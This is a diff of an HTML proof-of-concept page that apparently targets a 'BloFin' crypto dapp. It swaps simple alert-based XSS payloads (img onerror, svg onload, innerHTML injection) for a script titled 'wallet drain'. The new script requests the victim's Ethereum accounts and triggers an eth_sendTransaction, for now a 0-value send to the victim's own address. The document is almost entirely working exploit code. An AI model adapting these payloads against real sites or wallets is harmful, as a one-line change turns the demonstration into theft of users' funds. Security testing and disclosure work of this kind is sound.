@@ -1,36 +1,27 @@
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BLOFIN DAPP XSS TEST</title>
-<style>body{background:#000;color:#0f0;font-family:monospace;padding:14px} .box{border:1px solid #333;padding:10px;border-radius:10px;margin:12px 0;background:#111} h1{color:#ff9f0a}</style>
-</head><body>
-<h1>BLOFIN DAPP - XSS PoC</h1>
-
-<div class="box">
-<b>1. Auto Check - Kalau ini alert = KENA</b><br>
-<img src=x onerror="alert('XSS IMG: '+document.domain)">
-<svg onload="alert('XSS SVG: '+document.domain)"></svg>
-</div>
-
-<div class="box">
-<b>2. Token Name innerHTML</b><br>
-<div id="token"></div>
+<html><head><meta charset="UTF-8"><title>CRITICAL XSS</title></head><body>
+<h1>BLOFIN DAPP XSS -> WALLET DRAIN</h1>
 <script>
-const payload = '<img src=x onerror="alert(\'XSS TOKEN NAME: \'+document.domain)">';
-document.getElementById('token').innerHTML = payload;
+// 1. Buktikan XSS
+alert('XSS CONFIRMED: '+document.domain);
+
+// 2. Buktikan bisa akses provider dan minta akun (impact)
+async function pwn(){
+  if(window.ethereum){
+    try{
+      const accs = await window.ethereum.request({method:'eth_requestAccounts'});
+      alert('CRITICAL: Got accounts via XSS: '+accs[0]);
+      // 3. Proof bisa kirim tx 0 ETH ke diri sendiri (jangan drain beneran)
+      await window.ethereum.request({
+        method:'eth_sendTransaction',
+        params:[{from:accs[0], to:accs[0], value:'0x0'}]
+      });
+      alert('CRITICAL: XSS can trigger transaction!');
+    }catch(e){ alert('Error: '+e.message); }
+  }
+}
+setTimeout(pwn, 1000);
 </script>
-</div>
-
-<div class="box">
-<b>3. Provider Exposure</b><br>
-<button onclick="alert('ethereum: '+!!window.ethereum+' addr:'+window.ethereum?.selectedAddress)">CHECK window.ethereum</button>
-</div>
-
-<div class="box">
-<b>4. NFT Metadata</b><br>
-<div id="nft"></div>
-<script>
-document.getElementById('nft').innerHTML = "<svg onload=alert('XSS NFT: '+document.domain)>";
-</script>
-</div>
-
+<img src=x onerror="alert('AUTO XSS TOKEN: '+document.domain)">
+<svg onload="alert('AUTO XSS SVG: '+document.domain)">
 </body></html>
